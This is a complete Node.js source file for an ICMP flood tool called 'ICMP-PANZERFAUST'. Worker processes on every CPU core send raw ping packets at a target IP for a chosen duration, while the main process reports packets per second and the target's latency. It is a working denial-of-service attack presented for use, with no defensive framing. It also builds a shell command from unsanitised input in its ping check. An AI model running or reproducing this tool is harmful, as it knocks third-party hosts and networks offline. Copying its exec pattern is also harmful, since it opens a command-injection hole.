const raw = require('raw-socket');
const cluster = require('cluster');
const os = require('os');
const { exec } = require('child_process');

const target = process.argv[2];
const duration = parseInt(process.argv[3]);

if (!target || isNaN(duration)) {
  console.log('Usage: node attack.js <target_ip> <duration_seconds>');
  process.exit(1);
}

const cores = os.cpus().length;
const endTime = Date.now() + duration * 1000;

if (cluster.isMaster) {
  let stats = { sent: 0, success: 0, failed: 0, maxpps: 0 };
  let lastLatency = 'N/A';

  console.clear();
  console.log('ICMP-PANZERFAUST [AUTO-SAFE MODE]');
  console.log('--------------------------------------');
  console.log(`Target: ${target}`);
  console.log(`Duration: ${duration}s`);
  console.log(`Using ${cores} cores`);
  console.log('Launching...\n');

  for (let i = 0; i < cores; i++) cluster.fork();

  for (const id in cluster.workers) {
    cluster.workers[id].on('message', (msg) => {
      if (msg.type === 'stats') {
        stats.sent += msg.sent;
        stats.success += msg.success;
        stats.failed += msg.failed;
        if (msg.pps > stats.maxpps) stats.maxpps = msg.pps;
      }
    });
  }

  // Live output every 2 seconds
  setInterval(() => {
    console.clear();
    console.log('ICMP-PANZERFAUST [AUTO-SAFE MODE]');
    console.log('--------------------------------------');
    console.log(`Success: ${stats.success}`);
    console.log(`Failed: ${stats.failed}`);
    console.log(`Max PPS: ${stats.maxpps}`);
    console.log(`Total Sent: ${stats.sent}`);
    console.log(`Target Latency: ${lastLatency} ms`);
    console.log('--------------------------------------');
    stats.maxpps = 0;
  }, 2000);

  // Ping check
  setInterval(() => {
    exec(`ping -c 1 ${target}`, (err, stdout) => {
      const match = stdout.match(/time=([\d.]+) ms/);
      if (match) lastLatency = match[1];
    });
  }, 4000);

  setTimeout(() => {
    for (const id in cluster.workers) cluster.workers[id].kill();
    console.log('\nAttack finished.');
    process.exit(0);
  }, duration * 1000);

} else {
  const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });

  let seq = 0;
  let sent = 0;
  let success = 0;
  let failed = 0;
  let pps = 0;

  let safeMode = false;
  let throttleUntil = 0;

  function checksum(buf) {
    let sum = 0;
    for (let i = 0; i < buf.length; i += 2) sum += buf.readUInt16BE(i);
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return ~sum & 0xffff;
  }

  function packet(seq) {
    const buf = Buffer.alloc(8);
    buf.writeUInt8(8, 0);
    buf.writeUInt8(0, 1);
    buf.writeUInt16BE(0, 2);
    buf.writeUInt16BE(process.pid & 0xffff, 4);
    buf.writeUInt16BE(seq & 0xffff, 6);
    buf.writeUInt16BE(checksum(buf), 2);
    return buf;
  }

  function loop() {
    if (Date.now() >= endTime) return;

    // Dynamic throttle based on memory
    const mem = process.memoryUsage();
    const usedMB = mem.heapUsed / 1024 / 1024;

    if (!safeMode && usedMB > 700) {
      safeMode = true;
      throttleUntil = Date.now() + 10000;
      console.log(`[Worker ${process.pid}] ENTERED SAFE MODE - RAM too high: ${usedMB.toFixed(1)}MB`);
    }

    if (safeMode && Date.now() > throttleUntil) {
      safeMode = false;
      console.log(`[Worker ${process.pid}] EXITED SAFE MODE - Resuming full power`);
    }

    const throttle = safeMode ? 1000 : 0;
    const now = Date.now();

    if (now >= endTime) return;

    const pkt = packet(seq++);
    socket.send(pkt, 0, pkt.length, target, (err) => {
      sent++;
      pps++;
      if (err) failed++;
      else success++;
    });

    if (throttle > 0) {
      setTimeout(loop, throttle);
    } else {
      setImmediate(loop);
    }
  }

  loop();

  setInterval(() => {
    process.send({ type: 'stats', sent, success, failed, pps });
    sent = success = failed = pps = 0;
  }, 2000);
}
